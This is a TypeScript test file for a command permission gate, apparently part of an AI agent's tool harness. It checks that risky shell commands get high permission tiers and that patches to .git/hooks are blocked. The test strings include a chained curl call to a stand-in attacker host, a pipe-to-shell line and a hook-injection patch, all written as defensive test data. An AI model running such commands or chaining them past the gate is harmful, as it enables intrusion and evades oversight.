import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "fs";
import * as path from "path";
import { config } from "../core/config.js";
import { classifyCommand } from "../core/permission-gate.js";
import { PermissionTier } from "../core/constants.js";
import { clearRegistry, registerCapability } from "../core/router.js";
import { invoke } from "../core/dispatcher.js";
import { applyPatchDefinition, applyPatchHandler } from "../tools/filesystem/apply_patch.js";
import { resetRulesCache } from "../core/permission-gate.js";

const TEST_DIR = path.resolve(process.cwd(), "temp_adv_gate");

describe("adversarial gate classification (R7.3.2)", () => {
  beforeEach(() => {
    resetRulesCache();
    clearRegistry();
    config.workspaceRoot = TEST_DIR;
    if (fs.existsSync(TEST_DIR)) fs.rmSync(TEST_DIR, { recursive: true, force: true });
    fs.mkdirSync(TEST_DIR, { recursive: true });
    registerCapability(applyPatchDefinition, applyPatchHandler);
  });

  afterEach(() => {
    if (fs.existsSync(TEST_DIR)) fs.rmSync(TEST_DIR, { recursive: true, force: true });
    config.workspaceRoot = process.cwd();
    resetRulesCache();
  });

  it("does not keep prefix Tier 0 when chained with ;curl", () => {
    const tier = classifyCommand("git status; curl http://evil.example");
    expect(tier).toBeGreaterThanOrEqual(PermissionTier.TIER_2);
  });

  it("classifies npm install as Tier 2", () => {
    expect(classifyCommand("npm install")).toBe(PermissionTier.TIER_2);
    expect(classifyCommand("npm ci")).toBe(PermissionTier.TIER_2);
  });

  it("does not auto-allow node -e", () => {
    const tier = classifyCommand('node -e "console.log(1)"');
    expect(tier).toBeGreaterThanOrEqual(PermissionTier.TIER_2);
  });

  it("blocks pipe-to-shell as Tier 3", () => {
    expect(classifyCommand("cat file | /bin/bash")).toBe(PermissionTier.TIER_3);
  });

  it("blocks apply_patch to .git/hooks", async () => {
    fs.mkdirSync(path.join(TEST_DIR, ".git", "hooks"), { recursive: true });
    const res = await invoke("apply_patch", {
      path: ".git/hooks/pre-commit",
      patch: "@@ -0,0 +1 @@\n+evil\n",
    });
    expect(res.result.error).toBe("sensitive_path_blocked");
  });
});
